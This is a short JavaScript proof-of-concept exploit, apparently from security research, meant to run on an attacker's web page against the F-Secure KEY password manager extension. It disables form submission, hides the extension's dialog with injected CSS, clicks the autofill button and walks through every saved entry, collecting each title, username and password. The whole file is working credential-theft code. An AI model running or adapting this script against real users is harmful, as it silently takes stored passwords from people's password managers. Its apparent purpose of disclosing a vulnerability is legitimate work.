// Note: This script is intended to be running on the attacker's website.
// The purpose of this script is to be getting all retrieved usernames/passwords from the KEY app for a given website.


// Taken from the extension's code in order to closely match this script's functionality
function getDefaultPwdAndUserInputs() {
    for (var b = document.querySelectorAll("input[type='password']"), a = 0; a < b.length; a++) {
        if ("function" == typeof b[a].getBoundingClientRect) {
            var c = b[a].getBoundingClientRect();
            if (!c.width || !c.height) {
                continue;
            }
        }
        var d = b[a].form.querySelectorAll("input"), f = [], e;
        for (e in d) c = !1, "function" == typeof d[e].getBoundingClientRect && (c = d[e].getBoundingClientRect(), c = c.width && c.height), "text" != d[e].type && "email" != d[e].type || !c || f.push(d[e]);
        if (3 > f.length) {
            return [f[0], b[a]];
        }
    }
    return [];
}

// GET THEM ALL
function getAllUsernamesAndPasswords() {

    // Detect all forms on the page
    const forms = document.querySelectorAll("form");

    // Disable submitting the form
    for (const form of forms) {
        form.onsubmit = () => {
            return false;
        }
    }

    // Add CSS rules to make KEY's dialog and entries invisible
    const css = document.createElement("style");
    css.type = "text/css";
    css.innerHTML = "#fskey-iframe { background: none !important; box-shadow: none !important; border: none !important; display: none !important; }";
    document.body.appendChild(css);

    // Click on the F-secure button in username form
    document.querySelector("#fskey-user-icon").click();

    let currentEntry = 0;
    let entries = null;
    let entriesLength = null;

    // Click on the first saved username/password entry in order to fill it into a website
    function accessIframe() {
        const frameDoc = document.querySelector("#fskey-iframe").contentWindow.document;

        if (frameDoc && frameDoc.querySelector(".fskey-select-dlg-entry")) {

            if (!entries) {
                entries = frameDoc.querySelectorAll(".fskey-select-dlg-entry");
            }

            if (!entriesLength) {
                entriesLength = entries.length;
            }

            // Click on the KEY's entry
            frameDoc.querySelectorAll(".fskey-select-dlg-entry")[currentEntry].click();

            // Get username and password entries
            const usernameAndPassInputs = getDefaultPwdAndUserInputs();

            // A dirty way of getting the title name of a username/password entry
            frameDoc.querySelectorAll(".fskey-select-dlg-entry")[currentEntry].childNodes[0].childNodes[1].remove();

            const titleName = frameDoc.querySelectorAll(".fskey-select-dlg-entry")[currentEntry].childNodes[0].innerText;

            console.log(`Title: ${titleName}`);

            let i = 0;
            for (const input of usernameAndPassInputs) {
                if (i === 0) {
                    console.log(`Username: ${input.value}`);
                } else {
                    console.log(`Password: ${input.value}`);
                }
                i++;
            }

            // Style the button so we display it again
            document.querySelector("#fskey-user-icon").style.display = "inline";

            currentEntry++;

            if (currentEntry !== entriesLength) {
                accessIframe();
            }
        } else {
            setTimeout(accessIframe, 500);
        }
    }
    accessIframe();
}

getAllUsernamesAndPasswords();